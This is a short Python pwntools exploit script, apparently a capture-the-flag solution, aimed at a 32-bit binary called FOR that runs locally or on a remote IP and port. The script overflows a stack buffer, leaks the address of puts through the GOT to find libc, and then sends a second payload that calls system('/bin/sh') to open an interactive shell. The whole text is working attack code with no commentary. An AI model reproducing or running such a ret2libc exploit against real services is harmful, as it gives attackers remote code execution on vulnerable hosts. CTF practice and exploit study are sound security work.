from pwn import *
import sys

b = ELF("./FOR")
l = ELF("/lib/i386-linux-gnu/libc.so.6")

ret = 0x8048362
popret = 0x8048379
pop3ret = 0x8048609
pop4ret = 0x8048608
pop2ret = 0x804860a
addesp_12 = 0x8048376
addesp_16 = 0x8048455
bss = 0x0804a050

if (len(sys.argv) == 1):
	p = process("./FOR")
else:
	p = remote("13.209.121.90", 4646)

payload = "a"*(0x6c+4)
payload += p32(b.symbols['puts'])
payload += p32(b.symbols['main'])
payload += p32(b.got['puts'])

print p.recv() 
p.sendline(payload)

puts   = u32(p.recv(4))
libc   = puts - l.symbols['puts']
system = libc + l.symbols['system']
binsh  = libc + 0x15ba0b
log.info('puts   = 0x%x' % puts)
log.info("libc   = 0x%x" % libc)
log.info('system = 0x%x' % system)
log.info('binsh  = 0x%x' % binsh)

payload = "a"*(0x6c+4)
payload += p32(system)
payload += p32(0)
payload += p32(binsh)

print p.recv()
p.sendline(payload)

p.interactive()
